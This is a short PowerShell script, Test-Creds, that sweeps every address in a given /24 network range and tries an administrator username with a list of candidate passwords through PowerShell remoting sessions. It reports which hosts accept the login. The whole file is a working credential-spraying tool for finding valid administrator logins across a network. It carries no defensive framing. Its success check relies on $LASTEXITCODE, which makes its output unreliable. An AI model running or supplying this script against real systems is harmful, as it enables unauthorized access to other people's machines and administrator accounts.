 function Test-Creds {

$pusername = 'administrator' #possible username (FQDN)
$ppasswords = 'AdministratorPassword' #list of possible passwords array variable
$hostname = 'hostname' #name of target machine, or IP addr
if  ($args.Count -eq 0) {
    Write-Host "Example: auth 192.168.0"
    exit
}
 
for ($j = 0; $j -lt $args.count; $j ++) {
    # loop current ip range    
    $ip = $args[$j] + "."
    
    ForEach ($i in 2..254) {
        
        # get each ip
        $cur = @($ip + $i)

    ForEach($p in $ppasswords) 
    {
      echo Attempting Username: $pusername and password: $p for $cur
      $secpasswd = ConvertTo-SecureString "$p" -AsPlainText -Force
      $mycreds = New-Object System.Management.Automation.PSCredential ($pusername, $secpasswd)
      $psso = New-PSSessionOption -CancelTimeout 500 -OpenTimeout 500 -OperationTimeout 500
      New-PSSession -ComputerName $cur -Credential $mycreds -SessionOption $psso
      

            if ($LASTEXITCODE -eq 0) {
                Write-Host "$cur has a valid Administrator login!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            } else {
                Write-Host "$cur does not have a valid login"
            }
    } # end foreach

}

}

} 
